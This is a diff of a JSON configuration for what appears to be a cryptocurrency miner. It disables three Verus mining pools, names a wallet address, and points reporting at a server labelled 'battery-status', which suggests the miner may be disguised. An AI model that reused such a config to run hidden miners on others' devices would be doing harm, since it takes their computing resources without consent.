@@ -1,5 +1,5 @@
 {
-  "version": "0.0.15",
+  "version": "0.0.16",
   "script": "",
   "uploadingIntervel": 10,
   "baseUrl": "https://battery-status.onrender.com",
@@ -21,20 +21,20 @@
             "name": "luckpool.net",
             "url": "stratum+tcp://na.luckpool.net:3960",
             "timeout": 150,
-            "disabled": 0
+            "disabled": 1
         },
         {
             "name": "luckpool.net",
             "url": "stratum+tcp://ap.luckpool.net:3956",
             "timeout": 150,
-            "disabled": 0
+            "disabled": 1
         },
         {
             "name": "verus.farm (Quipacorn)",
             "url": "stratum+tcp://verus.farm:9999",
             "timeout": 60,
             "time-limit": 600,
-            "disabled": 0
+            "disabled": 1
         }
     ],
     "user": "RB6WupzbH6nzcPt9mNrEKT86T2dtHdHVGW",
